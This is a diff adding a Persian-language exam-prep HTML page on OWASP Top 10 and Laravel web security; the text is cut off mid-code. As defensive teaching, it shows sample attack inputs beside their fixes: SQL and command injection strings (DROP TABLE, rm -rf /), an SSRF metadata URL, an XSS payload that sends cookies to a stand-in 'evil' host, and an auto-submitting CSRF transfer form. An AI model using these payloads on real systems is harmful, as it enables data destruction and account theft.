@@ -1,0 +1,1327 @@
+<!doctype html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>OWASP &amp; Security — آمادگی آزمون</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body data-topic="owasp-security">
+<main id="content">
+
+  <header class="topic-hero">
+    <h1>OWASP &amp; Security</h1>
+    <p class="lead">امنیت اپلیکیشن وب از نگاه توسعه‌دهنده Backend: ده ریسک OWASP Top 10 با حمله نمونه و راه مقابله در Laravel، و بررسی عمیق SQL Injection، XSS، CSRF، کنترل دسترسی، احراز هویت و نشست، JWT، SSRF، آپلود فایل، رمزنگاری، هدرهای امنیتی، CORS، مدیریت secretها و STRIDE.</p>
+  </header>
+
+  <!-- ============ 1. Top 10 ============ -->
+  <section class="lesson" id="owasp-top10" data-title="OWASP Top 10 (2021)">
+    <h2>OWASP Top 10 (2021)</h2>
+    <p><strong>OWASP</strong> (Open Worldwide Application Security Project) یک بنیاد غیرانتفاعی است و <strong>Top 10</strong> آن یک <strong>سند آگاهی‌بخشی</strong> (awareness document) درباره رایج‌ترین و پرخطرترین دسته‌های ریسک در اپلیکیشن‌های وب است؛ استاندارد کامل امنیتی نیست (برای آن <strong>OWASP ASVS</strong> وجود دارد). هر آیتم یک «دسته» است که چندین CWE را پوشش می‌دهد.</p>
+
+    <div class="table-wrap"><table>
+      <thead><tr><th>کد</th><th>عنوان</th><th>حمله نمونه</th><th>مقابله (Laravel)</th></tr></thead>
+      <tbody>
+        <tr><td>A01</td><td><strong>Broken Access Control</strong></td><td>تغییر <code>/invoices/1001</code> به <code>/invoices/1002</code> (IDOR)، دسترسی کاربر عادی به <code>/admin</code></td><td>Policy/Gate، <code>Gate::authorize()</code>، scoped query، deny by default</td></tr>
+        <tr><td>A02</td><td><strong>Cryptographic Failures</strong></td><td>ذخیره رمز با MD5، ارسال داده روی HTTP، کلید ضعیف</td><td><code>Hash::make</code> (bcrypt/argon2id)، HTTPS + HSTS، <code>Crypt</code> و cast <code>encrypted</code></td></tr>
+        <tr><td>A03</td><td><strong>Injection</strong> (شامل XSS)</td><td><code>' OR 1=1 --</code>، تزریق دستور سیستم‌عامل، <code>&lt;script&gt;</code> در کامنت</td><td>Query Builder/Eloquent با binding، <code>{{ }}</code> در Blade، <code>escapeshellarg</code>، validation</td></tr>
+        <tr><td>A04</td><td><strong>Insecure Design</strong></td><td>بازیابی رمز با «سوال امنیتی»، نبود محدودیت روی تعداد خرید کد تخفیف</td><td>Threat modeling، الگوهای امن، rate limit روی جریان‌های کسب‌وکار</td></tr>
+        <tr><td>A05</td><td><strong>Security Misconfiguration</strong> (شامل XXE)</td><td><code>APP_DEBUG=true</code> در production، <code>.env</code> قابل دانلود، Telescope باز</td><td>hardening، document root روی <code>public/</code>، غیرفعال‌کردن ابزار دیباگ</td></tr>
+        <tr><td>A06</td><td><strong>Vulnerable and Outdated Components</strong></td><td>پکیج قدیمی با CVE شناخته‌شده</td><td><code>composer audit</code>، Dependabot، به‌روزرسانی منظم</td></tr>
+        <tr><td>A07</td><td><strong>Identification and Authentication Failures</strong></td><td>credential stuffing، session fixation، نبود MFA</td><td>throttle لاگین، <code>session()-&gt;regenerate()</code>، MFA، رمز قوی</td></tr>
+        <tr><td>A08</td><td><strong>Software and Data Integrity Failures</strong> (شامل Insecure Deserialization)</td><td><code>unserialize</code> روی ورودی کاربر، CI/CD آلوده، به‌روزرسانی بدون امضا</td><td>JSON به‌جای serialize، امضای داده، محافظت از pipeline</td></tr>
+        <tr><td>A09</td><td><strong>Security Logging and Monitoring Failures</strong></td><td>brute force هفته‌ها بی‌صدا ادامه دارد</td><td>لاگ رویدادهای امنیتی، alert، لاگ مرکزی</td></tr>
+        <tr><td>A10</td><td><strong>Server-Side Request Forgery (SSRF)</strong></td><td>ارسال URL <code>http://169.254.169.254/</code> به قابلیت «دریافت تصویر از لینک»</td><td>allowlist، بلاک IPهای داخلی، غیرفعال‌کردن redirect</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3>تغییرات مهم نسخه 2021 نسبت به 2017</h3>
+    <ul>
+      <li><strong>Broken Access Control</strong> از رتبه پنجم به <strong>رتبه اول</strong> رسید.</li>
+      <li><strong>XSS</strong> دیگر آیتم مستقل نیست و داخل <strong>Injection</strong> ادغام شد؛ <strong>XXE</strong> داخل Security Misconfiguration رفت.</li>
+      <li>«Sensitive Data Exposure» به <strong>Cryptographic Failures</strong> تغییر نام داد (تمرکز روی علت ریشه‌ای، نه علامت).</li>
+      <li>سه دسته جدید: <strong>Insecure Design</strong>، <strong>Software and Data Integrity Failures</strong> (که Insecure Deserialization را در بر می‌گیرد) و <strong>SSRF</strong>.</li>
+    </ul>
+
+    <div class="callout note"><p><strong>نسخه 2025:</strong> OWASP نسخه جدیدی با عنوان Top 10:2025 هم منتشر کرده است. در آن <strong>Broken Access Control</strong> همچنان رتبه اول است و <strong>SSRF</strong> به‌عنوان آیتم مستقل حذف و داخل آن ادغام شده؛ دسته <strong>Software Supply Chain Failures</strong> (گسترش‌یافته «Vulnerable and Outdated Components» به کل زنجیره تأمین: وابستگی‌ها، build و توزیع) و دسته جدید <strong>Mishandling of Exceptional Conditions</strong> (مدیریت نادرست خطاها و شرایط غیرعادی، مثلاً fail-open) اضافه شده‌اند. اگر سوال نسخه را مشخص نکرده بود، بر اساس 2021 پاسخ دهید و در صورت لزوم به این تغییرات اشاره کنید.</p></div>
+
+    <div class="callout exam"><p>تفاوت <strong>Insecure Design</strong> با پیاده‌سازی ناامن را بدانید: Insecure Design یعنی <strong>کنترل امنیتی لازم اصلاً طراحی نشده</strong> (مثلاً هیچ محدودیتی برای تعداد تلاش OTP در نظر گرفته نشده)؛ با کدنویسی بی‌نقص هم رفع نمی‌شود. پیاده‌سازی ناامن یعنی طراحی درست بوده ولی کد باگ دارد. راه مقابله Insecure Design: <strong>threat modeling</strong>، الگوهای طراحی امن و <strong>abuse case</strong> در کنار use case.</p></div>
+  </section>
+
+  <!-- ============ 2. Access control ============ -->
+  <section class="lesson" id="access-control" data-title="Broken Access Control و IDOR">
+    <h2>Broken Access Control و IDOR</h2>
+    <p><strong>Authentication</strong> می‌پرسد «تو کی هستی؟»؛ <strong>Authorization</strong> می‌پرسد «اجازه انجام این کار روی این منبع را داری؟». Broken Access Control یعنی کاربر بتواند خارج از مجوزش عمل کند. رایج‌ترین شکل آن <strong>IDOR</strong> (Insecure Direct Object Reference) است: سرور شناسه منبع را از کاربر می‌گیرد و بدون بررسی مالکیت، منبع را برمی‌گرداند یا تغییر می‌دهد.</p>
+
+    <h3>انواع</h3>
+    <ul>
+      <li><strong>Horizontal privilege escalation</strong>: دسترسی به داده کاربر دیگر هم‌سطح (سفارش‌های کاربر دیگر).</li>
+      <li><strong>Vertical privilege escalation</strong>: انجام عمل نقش بالاتر (کاربر عادی endpoint ادمین را صدا می‌زند).</li>
+      <li>دستکاری پارامتر یا فیلد مخفی (<code>role=admin</code>، <code>price=0</code>)، force browsing به URLهای پنهان، تکیه بر مخفی‌کردن دکمه در UI، و متدهای HTTP محافظت‌نشده (GET بررسی می‌شود ولی DELETE نه).</li>
+    </ul>
+
+    <pre><code class="language-php">&lt;?php
+// نادرست: IDOR — هر کاربر لاگین‌کرده هر فاکتوری را می‌بیند
+Route::get('/invoices/{id}', function (int $id) {
+    return Invoice::findOrFail($id);
+})-&gt;middleware('auth');</code></pre>
+
+    <h3>راه مقابله در Laravel</h3>
+    <pre><code class="language-php">&lt;?php
+// app/Policies/InvoicePolicy.php  (با auto-discovery نیازی به ثبت دستی نیست)
+final class InvoicePolicy
+{
+    public function before(User $user, string $ability): ?bool
+    {
+        return $user-&gt;isAdmin() ? true : null; // null یعنی برو سراغ متد اصلی
+    }
+
+    public function view(User $user, Invoice $invoice): bool
+    {
+        return $invoice-&gt;user_id === $user-&gt;id;
+    }
+
+    public function update(User $user, Invoice $invoice): Response
+    {
+        return $invoice-&gt;user_id === $user-&gt;id
+            ? Response::allow()
+            : Response::denyAsNotFound(); // 404 به‌جای 403 تا وجود منبع لو نرود
+    }
+}
+
+// Controller
+public function show(Invoice $invoice)
+{
+    Gate::authorize('view', $invoice); // در صورت عدم مجوز AuthorizationException → 403
+    return new InvoiceResource($invoice);
+}
+
+// یا روی route
+Route::put('/invoices/{invoice}', [InvoiceController::class, 'update'])
+    -&gt;middleware('auth')
+    -&gt;can('update', 'invoice');
+
+// یا محدودکردن خود کوئری به داده‌های کاربر (دفاع اضافه)
+$invoice = $request-&gt;user()-&gt;invoices()-&gt;findOrFail($id);
+
+// Scoped binding: پست حتماً متعلق به همین کاربر باشد
+Route::get('/users/{user}/posts/{post}', fn (User $user, Post $post) =&gt; $post)
+    -&gt;scopeBindings();</code></pre>
+    <p>در Blade برای نمایش شرطی از <code>@can('update', $invoice)</code> استفاده کنید، ولی یادتان باشد مخفی‌کردن دکمه <strong>کنترل دسترسی نیست</strong>؛ بررسی باید همیشه <strong>سمت سرور</strong> و در هر درخواست انجام شود.</p>
+
+    <h3>اصول</h3>
+    <ul>
+      <li><strong>Deny by default</strong>: هر چیزی که صریحاً مجاز نشده، ممنوع است.</li>
+      <li>بررسی مجوز در <strong>یک مکان متمرکز</strong> (Policy) نه پراکنده در کنترلرها.</li>
+      <li><strong>UUID/ULID</strong> (<code>HasUuids</code>، <code>HasUlids</code>) حدس‌زدن شناسه را سخت می‌کند و جلوی enumeration را می‌گیرد، ولی <strong>جایگزین authorization نیست</strong> (security through obscurity).</li>
+      <li>تست خودکار برای سناریوهای منفی: «کاربر B نباید بتواند فاکتور کاربر A را ببیند».</li>
+      <li>در API چندمستأجری (multi-tenant)، global scope روی <code>tenant_id</code> + Policy.</li>
+    </ul>
+    <div class="callout exam"><p>در پاسخ به سوال IDOR حتماً بنویسید که مشکل <strong>نبود بررسی مالکیت/مجوز سمت سرور</strong> است، نه قابل حدس بودن id. راه‌حل اصلی Policy/Gate یا scope کردن کوئری به کاربر جاری است؛ UUID فقط لایه دفاعی تکمیلی است.</p></div>
+  </section>
+
+  <!-- ============ 3. SQL injection ============ -->
+  <section class="lesson" id="sql-injection" data-title="SQL Injection و سایر Injectionها">
+    <h2>SQL Injection و سایر Injectionها</h2>
+    <p><strong>Injection</strong> وقتی رخ می‌دهد که داده غیرقابل‌اعتماد به‌عنوان بخشی از یک <strong>دستور یا کوئری</strong> به یک مفسر (SQL، shell، LDAP، template engine) فرستاده شود و مفسر نتواند <strong>کد</strong> را از <strong>داده</strong> تشخیص دهد.</p>
+
+    <pre><code class="language-php">&lt;?php
+// نادرست: concatenation
+$email = $request-&gt;input('email');
+$users = DB::select("SELECT * FROM users WHERE email = '$email'");
+// ورودی: ' OR '1'='1  ← همه کاربران برگردانده می‌شوند
+// ورودی: '; DROP TABLE users; --  ← اگر درایور چند statement را اجازه دهد</code></pre>
+
+    <h3>چرا Prepared Statement جلوی آن را می‌گیرد؟</h3>
+    <p>در <strong>parameterized query</strong>، ساختار کوئری (با placeholder) و مقادیر <strong>جداگانه</strong> به دیتابیس ارسال می‌شوند؛ دیتابیس ابتدا کوئری را parse می‌کند و سپس مقدار را فقط به‌عنوان <strong>داده</strong> در آن قرار می‌دهد. هر چه کاربر بفرستد، هرگز بخشی از دستور SQL نمی‌شود. این با «escape کردن» تفاوت بنیادی دارد که به درستی تابع escape و charset وابسته است.</p>
+
+    <pre><code class="language-php">&lt;?php
+// درست: Eloquent و Query Builder به‌صورت خودکار از PDO binding استفاده می‌کنند
+User::where('email', $request-&gt;input('email'))-&gt;first();
+
+// درست: raw با placeholder
+DB::select('SELECT * FROM users WHERE email = ?', [$email]);
+DB::select('SELECT * FROM users WHERE email = :email', ['email' =&gt; $email]);
+User::whereRaw('LOWER(email) = ?', [strtolower($email)])-&gt;get();
+Order::selectRaw('SUM(total) as revenue')-&gt;whereRaw('created_at &gt;= ?', [$from]);
+
+// نادرست: متدهای raw با رشته الحاق‌شده — binding خودکار وجود ندارد
+User::whereRaw("email = '$email'")-&gt;get();
+DB::statement("UPDATE users SET name = '$name'");
+Order::orderByRaw($request-&gt;input('sort'));</code></pre>
+
+    <h3>جاهایی که binding کمک نمی‌کند: نام ستون و جهت مرتب‌سازی</h3>
+    <p>Placeholder فقط برای <strong>مقدار</strong> است؛ نام جدول، نام ستون، <code>ASC/DESC</code> و کلمات کلیدی را نمی‌توان bind کرد. برای اینها از <strong>allowlist</strong> استفاده کنید:</p>
+    <pre><code class="language-php">&lt;?php
+$sortable = ['created_at', 'total', 'status'];
+$column = in_array($request-&gt;input('sort'), $sortable, true) ? $request-&gt;input('sort') : 'created_at';
+$direction = $request-&gt;input('dir') === 'asc' ? 'asc' : 'desc';
+
+Order::orderBy($column, $direction)-&gt;paginate();
+
+// یا با validation
+$request-&gt;validate(['sort' =&gt; ['nullable', Rule::in($sortable)]]);</code></pre>
+
+    <h3>سایر انواع Injection</h3>
+    <ul>
+      <li><strong>Command Injection</strong>: <code>exec("convert {$file} out.png")</code> با نام فایل <code>a.png; rm -rf /</code>. مقابله: پرهیز از shell، استفاده از کتابخانه، یا <code>escapeshellarg()</code> برای هر آرگومان؛ در Laravel 10+ از <code>Process::run([...])</code> با آرایه آرگومان استفاده کنید تا shell درگیر نشود.</li>
+      <li><strong>NoSQL Injection</strong>: در MongoDB ارسال <code>{"password": {"$ne": null}}</code> به‌جای رشته. مقابله: اعتبارسنجی نوع (<code>'password' =&gt; 'string'</code>).</li>
+      <li><strong>LDAP / XPath / Header Injection</strong> و <strong>CRLF Injection</strong> در هدرها یا لاگ‌ها.</li>
+      <li><strong>Server-Side Template Injection</strong>: کامپایل قالب از ورودی کاربر (مثلاً <code>Blade::render($userInput)</code>) که به اجرای کد می‌رسد.</li>
+    </ul>
+
+    <h3>دفاع چندلایه</h3>
+    <ul>
+      <li>کاربر دیتابیس اپلیکیشن با <strong>حداقل دسترسی</strong> (بدون <code>DROP</code>، <code>GRANT</code>، <code>FILE</code>).</li>
+      <li>اعتبارسنجی ورودی با نوع و قالب مشخص (allowlist)، اما به‌عنوان لایه <strong>تکمیلی</strong> نه جایگزین binding.</li>
+      <li>نمایش‌ندادن خطای SQL به کاربر (<code>APP_DEBUG=false</code>) تا error-based injection سخت شود.</li>
+      <li>WAF به‌عنوان لایه اضافه، نه راه‌حل اصلی.</li>
+    </ul>
+    <div class="callout warn"><p>اشتباه رایج: «چون از Eloquent استفاده می‌کنم، از SQL Injection در امانم». متدهای <code>whereRaw</code>، <code>selectRaw</code>، <code>orderByRaw</code>، <code>havingRaw</code>، <code>DB::raw</code>، <code>DB::statement</code> و <code>DB::unprepared</code> اگر رشته را با ورودی کاربر بسازید، آسیب‌پذیرند. همچنین نام ستون پویا در <code>orderBy</code> و <code>where</code> بدون allowlist.</p></div>
+    <div class="callout exam"><p>انواع SQLi که ممکن است بپرسند: <strong>In-band</strong> (Union-based و Error-based: نتیجه در همان پاسخ)، <strong>Blind</strong> (Boolean-based و Time-based با <code>SLEEP()</code>: فقط رفتار پاسخ تغییر می‌کند) و <strong>Out-of-band</strong> (ارسال داده از طریق DNS/HTTP). همچنین <strong>Second-order</strong>: داده مخرب ذخیره می‌شود و بعداً در کوئری دیگری بدون binding استفاده می‌شود.</p></div>
+  </section>
+
+  <!-- ============ 4. XSS ============ -->
+  <section class="lesson" id="xss" data-title="Cross-Site Scripting (XSS) و CSP">
+    <h2>Cross-Site Scripting (XSS) و CSP</h2>
+    <p><strong>XSS</strong> یعنی تزریق اسکریپت مخرب به صفحه‌ای که مرورگر قربانی آن را از <strong>origin سایت معتبر</strong> می‌بیند؛ اسکریپت با همان دسترسی‌های سایت اجرا می‌شود: خواندن DOM، ارسال درخواست با کوکی‌های کاربر، سرقت توکن در <code>localStorage</code>، keylogging یا تغییر محتوای صفحه (phishing).</p>
+
+    <div class="table-wrap"><table>
+      <thead><tr><th>نوع</th><th>محل payload</th><th>مثال</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Stored (Persistent)</strong></td><td>در دیتابیس ذخیره و برای همه بازدیدکنندگان نمایش داده می‌شود</td><td>کامنت حاوی <code>&lt;script&gt;fetch('//evil?c='+document.cookie)&lt;/script&gt;</code></td></tr>
+        <tr><td><strong>Reflected</strong></td><td>در درخواست (URL) است و سرور آن را بدون escape در پاسخ بازتاب می‌دهد</td><td><code>/search?q=&lt;script&gt;...&lt;/script&gt;</code> که با لینک برای قربانی فرستاده می‌شود</td></tr>
+        <tr><td><strong>DOM-based</strong></td><td>کاملاً سمت کلاینت: JS داده را از منبع ناامن (<code>location.hash</code>) در sink خطرناک (<code>innerHTML</code>) می‌نویسد</td><td><code>el.innerHTML = location.hash.slice(1)</code></td></tr>
+      </tbody>
+    </table></div>
+
+    <h3>Blade: <code>{{ }}</code> در برابر <code>{!! !!}</code></h3>
+    <pre><code class="language-php">{{-- درست: خروجی با htmlspecialchars (ENT_QUOTES, UTF-8) escape می‌شود --}}
+&lt;p&gt;{{ $comment-&gt;body }}&lt;/p&gt;
+
+{{-- نادرست: خروجی خام؛ فقط برای HTML کاملاً مورد اعتماد یا sanitize‌شده --}}
+&lt;div&gt;{!! $comment-&gt;body !!}&lt;/div&gt;
+
+{{-- خطر حتی با {{ }}: escape جلوی URLهای javascript: را نمی‌گیرد --}}
+&lt;a href="{{ $user-&gt;website }}"&gt;سایت&lt;/a&gt;   {{-- javascript:alert(1) --}}
+
+{{-- داده در context جاوااسکریپت: از @js یا Js::from استفاده کنید --}}
+&lt;script&gt;
+    const config = @js($settings);
+&lt;/script&gt;</code></pre>
+
+    <h3>اصل کلیدی: Context-aware output encoding</h3>
+    <p>Escape باید متناسب با <strong>context</strong> خروجی باشد: بدنه HTML، مقدار attribute (همیشه داخل کوتیشن)، داخل JavaScript، داخل URL و داخل CSS هر کدام encoding متفاوتی دارند. <code>{{ }}</code> فقط برای context بدنه و attribute کوتیشن‌دار HTML طراحی شده است.</p>
+    <ul>
+      <li>برای URL کاربر، scheme را validate کنید (<code>'website' =&gt; ['url:http,https']</code>).</li>
+      <li>اگر کاربر باید HTML بنویسد (ویرایشگر WYSIWYG)، خروجی را با یک <strong>HTML sanitizer مبتنی بر allowlist</strong> (مثل HTML Purifier) پاکسازی کنید؛ هرگز با regex.</li>
+      <li>در فرانت‌اند <code>textContent</code> به‌جای <code>innerHTML</code>؛ React و Vue به‌طور پیش‌فرض escape می‌کنند ولی <code>dangerouslySetInnerHTML</code> و <code>v-html</code> همان <code>{!! !!}</code> هستند.</li>
+      <li>کوکی session با <strong>HttpOnly</strong> تا JS نتواند آن را بخواند (تأثیر XSS را کم می‌کند، رفعش نمی‌کند).</li>
+      <li>پاسخ‌های API با <code>Content-Type: application/json</code> و <code>X-Content-Type-Options: nosniff</code>.</li>
+    </ul>
+
+    <h3>Content Security Policy (CSP)</h3>
+    <p>CSP یک هدر پاسخ است که به مرورگر می‌گوید از چه منابعی اجازه بارگذاری و اجرای اسکریپت، استایل، تصویر و … وجود دارد. یک <strong>لایه دفاعی دوم</strong> است: حتی اگر XSS تزریق شود، اسکریپت inline یا از دامنه ناشناس اجرا نمی‌شود.</p>
+    <pre><code class="language-plaintext">Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-r4nd0m';
+  object-src 'none';
+  base-uri 'self';
+  frame-ancestors 'none';
+  form-action 'self';</code></pre>
+    <ul>
+      <li>از <code>'unsafe-inline'</code> و <code>'unsafe-eval'</code> در <code>script-src</code> پرهیز کنید؛ به‌جایش <strong>nonce</strong> تصادفی برای هر پاسخ یا hash. در Laravel، <code>Vite::useCspNonce()</code> nonce را به تگ‌های اسکریپت Vite اضافه می‌کند.</li>
+      <li>ابتدا با <code>Content-Security-Policy-Report-Only</code> و گزارش‌گیری شروع کنید تا سایت نشکند، سپس enforce کنید.</li>
+      <li><code>frame-ancestors</code> جایگزین مدرن <code>X-Frame-Options</code> برای مقابله با clickjacking است.</li>
+    </ul>
+    <div class="callout exam"><p>ترتیب دفاع در برابر XSS را این‌طور بنویسید: (۱) <strong>output encoding متناسب با context</strong> (اصلی‌ترین)، (۲) <strong>sanitize</strong> وقتی HTML لازم است، (۳) <strong>validation ورودی</strong>، (۴) <strong>CSP</strong> به‌عنوان defense in depth، (۵) کوکی <strong>HttpOnly</strong> برای کاهش اثر. و تأکید کنید که encoding باید <strong>در زمان خروجی</strong> انجام شود نه در زمان ذخیره، چون یک داده ممکن است در چند context استفاده شود.</p></div>
+    <div class="callout warn"><p>هدر <code>X-XSS-Protection</code> منسوخ است و مرورگرهای مدرن فیلتر XSS را حذف کرده‌اند؛ آن را راهکار ذکر نکنید. راهکار مدرن CSP است.</p></div>
+  </section>
+
+  <!-- ============ 5. CSRF ============ -->
+  <section class="lesson" id="csrf" data-title="CSRF و SameSite">
+    <h2>CSRF و SameSite</h2>
+    <p><strong>Cross-Site Request Forgery</strong>: سایت مهاجم مرورگر قربانیِ لاگین‌کرده را وادار می‌کند درخواستی تغییردهنده وضعیت به سایت هدف بفرستد. چون مرورگر <strong>کوکی‌های سایت هدف را خودکار ضمیمه می‌کند</strong>، سرور درخواست را معتبر و از طرف کاربر می‌بیند. مهاجم پاسخ را نمی‌بیند؛ هدفش <strong>اثر جانبی</strong> است (انتقال وجه، تغییر ایمیل).</p>
+    <pre><code class="language-xml">&lt;!-- روی evil.example — به‌محض باز شدن صفحه ارسال می‌شود --&gt;
+&lt;form action="https://bank.example/transfer" method="POST" id="f"&gt;
+  &lt;input type="hidden" name="to" value="attacker"&gt;
+  &lt;input type="hidden" name="amount" value="1000000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;</code></pre>
+
+    <h3>شرایط لازم برای CSRF</h3>
+    <ul>
+      <li>احراز هویت مبتنی بر چیزی که مرورگر <strong>خودکار</strong> می‌فرستد (کوکی، HTTP Basic، گواهی کلاینت).</li>
+      <li>درخواست تغییردهنده وضعیت که پارامترهایش قابل پیش‌بینی است.</li>
+      <li>نبود توکن غیرقابل حدس یا بررسی origin.</li>
+    </ul>
+    <p>پس APIای که فقط با هدر <code>Authorization: Bearer …</code> احراز هویت می‌کند (توکن در کوکی نیست) ذاتاً در برابر CSRF آسیب‌پذیر نیست؛ چون مرورگر این هدر را خودکار اضافه نمی‌کند.</p>
+
+    <h3>دفاع‌ها</h3>
+    <ol>
+      <li><strong>Synchronizer Token</strong>: توکن تصادفی مرتبط با session در هر فرم؛ سرور مقایسه می‌کند. سایت مهاجم به‌خاطر <strong>Same-Origin Policy</strong> نمی‌تواند توکن را بخواند.</li>
+      <li><strong>SameSite cookie</strong>: <code>Strict</code> (کوکی در هیچ درخواست cross-site ارسال نمی‌شود)، <code>Lax</code> (فقط در navigation سطح بالا با متد امن مثل GET ارسال می‌شود؛ POST cross-site بدون کوکی)، <code>None</code> (همیشه، به شرط <code>Secure</code>).</li>
+      <li>بررسی هدرهای <code>Origin</code>/<code>Referer</code> و هدرهای Fetch Metadata (<code>Sec-Fetch-Site</code>) به‌عنوان لایه تکمیلی.</li>
+      <li>متدهای امن (<strong>GET، HEAD</strong>) هرگز نباید وضعیت را تغییر دهند.</li>
+      <li>برای عملیات حساس: احراز هویت مجدد (رمز فعلی، OTP).</li>
+    </ol>
+
+    <h3>CSRF در Laravel</h3>
+    <pre><code class="language-php">{{-- در فرم‌های Blade --}}
+&lt;form method="POST" action="/profile"&gt;
+    @csrf
+    @method('PUT')
+    ...
+&lt;/form&gt;
+
+// bootstrap/app.php (Laravel 11+): مستثنی کردن webhookها
+-&gt;withMiddleware(function (Middleware $middleware) {
+    $middleware-&gt;validateCsrfTokens(except: [
+        'stripe/*',
+    ]);
+})</code></pre>
+    <ul>
+      <li>middleware <code>ValidateCsrfToken</code> (در نسخه‌های قدیمی <code>VerifyCsrfToken</code>) روی گروه <code>web</code> فعال است و برای <code>POST/PUT/PATCH/DELETE</code> توکن را از فیلد <code>_token</code> یا هدر <code>X-CSRF-TOKEN</code> می‌خواند.</li>
+      <li>Laravel توکن را در کوکی <code>XSRF-TOKEN</code> هم قرار می‌دهد؛ Axios آن را خودکار در هدر <code>X-XSRF-TOKEN</code> برمی‌گرداند (الگوی <strong>double submit</strong>). Sanctum در حالت SPA بر همین مکانیزم تکیه دارد (<code>/sanctum/csrf-cookie</code>).</li>
+      <li>تنظیم <code>same_site</code> در <code>config/session.php</code> به‌طور پیش‌فرض <code>lax</code> است.</li>
+      <li>route‌های مستثنی‌شده (webhook) باید با روش دیگری احراز شوند، مثلاً <strong>امضای HMAC</strong> درخواست.</li>
+    </ul>
+    <div class="callout exam"><p>«آیا SameSite=Lax کافی است؟» پاسخ: یک لایه دفاعی قوی است ولی جایگزین کامل توکن نیست؛ چون (۱) GETهایی که اشتباهاً وضعیت را تغییر می‌دهند محافظت نمی‌شوند، (۲) درخواست از <strong>subdomain‌های همان site</strong> (مثلاً یک زیردامنه آسیب‌پذیر) same-site حساب می‌شود، (۳) مرورگرهای قدیمی پشتیبانی نمی‌کنند. پس <strong>توکن + SameSite</strong>.</p></div>
+    <div class="callout warn"><p>CORS از CSRF محافظت نمی‌کند. CORS فقط تعیین می‌کند اسکریپت cross-origin بتواند <strong>پاسخ را بخواند</strong>؛ «درخواست‌های ساده» (مثل POST فرم با <code>application/x-www-form-urlencoded</code>) بدون preflight ارسال و روی سرور اجرا می‌شوند.</p></div>
+  </section>
+
+  <!-- ============ 6. Authentication & session ============ -->
+  <section class="lesson" id="authentication" data-title="احراز هویت، رمز عبور و Session">
+    <h2>احراز هویت، رمز عبور و Session</h2>
+
+    <h3>ذخیره رمز عبور</h3>
+    <p>رمز عبور هرگز نباید به‌صورت متن ساده یا رمزنگاری‌شده (برگشت‌پذیر) ذخیره شود؛ باید با یک <strong>تابع هش مخصوص رمز عبور</strong> (کند، با salt) هش شود.</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>الگوریتم</th><th>وضعیت</th><th>دلیل</th></tr></thead>
+      <tbody>
+        <tr><td>MD5، SHA-1</td><td>ممنوع</td><td>بسیار سریع (میلیاردها هش در ثانیه با GPU)، rainbow table، MD5 و SHA-1 برخورد (collision) عملی دارند</td></tr>
+        <tr><td>SHA-256 ساده (حتی با salt)</td><td>نامناسب برای رمز</td><td>امن برای integrity ولی <strong>سریع</strong> است؛ brute force آفلاین ارزان است</td></tr>
+        <tr><td><strong>bcrypt</strong></td><td>مناسب (پیش‌فرض Laravel)</td><td>salt داخلی، cost factor قابل تنظیم؛ فقط ۷۲ بایت اول ورودی را در نظر می‌گیرد</td></tr>
+        <tr><td><strong>Argon2id</strong></td><td>توصیه مدرن</td><td>برنده Password Hashing Competition؛ memory-hard و مقاوم در برابر GPU/ASIC</td></tr>
+      </tbody>
+    </table></div>
+    <pre><code class="language-php">&lt;?php
+use Illuminate\Support\Facades\Hash;
+
+$hash = Hash::make($request-&gt;password);        // bcrypt با cost پیش‌فرض
+Hash::check($plain, $user-&gt;password);           // مقایسه در زمان ثابت
+if (Hash::needsRehash($user-&gt;password)) { /* ... */ }
+
+// Model: cast "hashed" تضمین می‌کند رمز همیشه هش ذخیره شود
+protected function casts(): array
+{
+    return ['password' =&gt; 'hashed'];
+}
+
+// PHP خالص
+password_hash($plain, PASSWORD_ARGON2ID);
+password_verify($plain, $hash);</code></pre>
+    <ul>
+      <li><strong>Salt</strong>: مقدار تصادفی یکتا برای هر کاربر که کنار هش ذخیره می‌شود؛ جلوی rainbow table و تشخیص رمزهای یکسان را می‌گیرد. bcrypt و Argon2 خودشان salt می‌سازند.</li>
+      <li><strong>Pepper</strong>: راز سراسری که بیرون از دیتابیس نگه‌داری می‌شود؛ اختیاری.</li>
+      <li>سیاست رمز: <strong>طول</strong> مهم‌تر از قواعد پیچیدگی؛ بررسی در لیست رمزهای لو رفته: <code>Password::min(12)-&gt;uncompromised()</code>.</li>
+      <li>برای مقایسه توکن‌ها و امضاها از <code>hash_equals()</code> استفاده کنید تا timing attack رخ ندهد.</li>
+    </ul>
+
+    <h3>حملات رایج و مقابله</h3>
+    <ul>
+      <li><strong>Brute force / Credential stuffing</strong> (استفاده از رمزهای لو رفته سایت‌های دیگر): rate limiting بر اساس ترکیب <strong>ایمیل + IP</strong>، lockout موقت، CAPTCHA پس از چند شکست، <strong>MFA</strong>.</li>
+      <li><strong>User enumeration</strong>: پیام خطای یکسان برای «کاربر وجود ندارد» و «رمز اشتباه» و زمان پاسخ مشابه؛ همچنین در «فراموشی رمز» پیام عمومی «اگر حساب وجود داشته باشد ایمیل ارسال شد».</li>
+      <li><strong>Session fixation</strong>: مهاجم یک session id معلوم را به قربانی تحمیل می‌کند و پس از لاگین قربانی، با همان id وارد می‌شود. مقابله: <strong>تولید session id جدید پس از لاگین</strong> و تغییر سطح دسترسی.</li>
+      <li><strong>Session hijacking</strong>: سرقت کوکی با XSS یا شنود. مقابله: <code>HttpOnly</code>، <code>Secure</code>، HTTPS، انقضای مناسب.</li>
+      <li><strong>Password reset ناامن</strong>: توکن قابل حدس یا بدون انقضا؛ توکن باید تصادفی، یک‌بارمصرف، با انقضای کوتاه و هش‌شده در DB باشد (Laravel همین کار را می‌کند).</li>
+    </ul>
+
+    <pre><code class="language-php">&lt;?php
+// AppServiceProvider::boot()
+RateLimiter::for('login', function (Request $request) {
+    return [
